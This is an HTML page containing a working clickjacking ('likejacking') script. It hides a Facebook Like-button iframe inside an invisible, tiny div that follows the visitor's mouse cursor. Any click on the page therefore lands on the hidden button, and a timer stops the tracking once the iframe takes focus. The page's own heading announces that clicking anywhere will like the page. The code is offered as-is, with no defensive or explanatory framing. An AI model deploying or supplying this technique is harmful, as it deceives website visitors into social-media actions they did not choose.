!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title></title>
  <script src="jquery-1.9.1.js" type="text/javascript"></script>
  <script type="text/javascript">
    var interval = 0;
    function updateActiveElement() {
      if($(document.activeElement).attr('id') == "fb-iframe") {
        clearInterval(interval);
        bodyClicked = true;
      }
    }
    $(function() {
      interval = setInterval("updateActiveElement();", 50);
    });
  </script>
</head>
<body>
  <center>
    <h1>Click anywhere on this site you will automatically like this page</h1>
  </center>
  <div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
    <iframe src="http://www.facebook.com/plugins/like.php?href=http://www.facebook.com/GeeKhmer[/COLOR]&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fb-iframe" name="fb-iframe">
    </iframe>
  </div>

  <script type="text/javascript">
    var bodyClicked = false;
    var iframeWrapper = document.getElementById('iframe-wrapper');
    var standardBody=(document.compatMode=="CSS1Compat") ? document.documentElement : document.body 

    function mouseFollower(e) {
      // for internet explorer
      if (window.event) { 
        iframeWrapper.style.top = (window.event.y-5)+standardBody.scrollTop+'px';
        iframeWrapper.style.left = (window.event.x-5)+standardBody.scrollLeft+'px';
      }
      else {
        iframeWrapper.style.top = (e.pageY-5)+'px';
        iframeWrapper.style.left = (e.pageX-5)+'px';
      }
    }
    document.onmousemove = function(e) {
      if(bodyClicked == false) {
        mouseFollower(e);
      }
    }
  </script>
</body>
</html>
